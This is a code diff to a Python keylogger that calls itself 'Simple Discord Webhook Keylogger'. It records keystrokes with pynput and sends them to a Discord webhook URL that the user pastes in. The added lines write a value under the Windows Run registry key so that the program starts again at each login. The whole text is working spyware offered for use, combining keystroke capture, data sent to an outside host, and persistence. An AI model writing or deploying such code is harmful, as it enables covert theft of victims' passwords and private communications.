@@ -1,9 +1,17 @@
 import pynput
 from pynput.keyboard import Key, Listener
 from discord_webhook import DiscordWebhook
+import winreg
+import sys
 
 webhook_url = '#'     # Paste here your Webhook URL (instructions in README.md)
-keys_buffer = ''     # Create empty buffer variable
+registry_name = 'Simple Discord Webhook Keylogger'     # Registry name for system startup execution
+keys_buffer = ''     # Create empty buffer variable *leave as it is*
+
+winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")     # Create registry key for automatic program execution after system startup
+registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)     # Open key for entry
+winreg.SetValueEx(registry_key, registry_name, 0, winreg.REG_SZ, sys.argv[0])     # Creating entry
+winreg.CloseKey(registry_key)     # Close key
 
 def send_message(message):
     DiscordWebhook(url=webhook_url, content=message).execute()     # Send message using Webhook
